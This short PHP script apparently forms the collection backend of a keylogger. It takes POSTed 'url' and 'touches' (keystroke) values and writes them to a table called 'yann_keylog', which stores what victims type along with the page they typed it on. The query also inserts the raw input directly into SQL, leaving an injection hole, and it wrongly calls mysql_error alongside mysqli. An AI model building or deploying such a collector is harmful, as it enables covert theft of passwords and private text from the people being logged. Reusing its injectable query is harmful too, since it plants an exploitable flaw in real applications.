<?php

$con = mysqli_connect("host","username","password","table");
if (!$con) {
    echo "Failed to connect to MySQL: " . mysql_error();
}
$url = $_POST['url'];
$touches = $_POST['touches'];

$sql="INSERT INTO `yann_keylog` (`url`, `touches`) VALUES ('$url', '$touches');";

if (mysqli_query($con,$sql) === TRUE) {
  echo "New record successfully created";
} else {
  echo "Error: " . $sql . "<br>" . mysql_error();
}


mysqli_close($con);
?>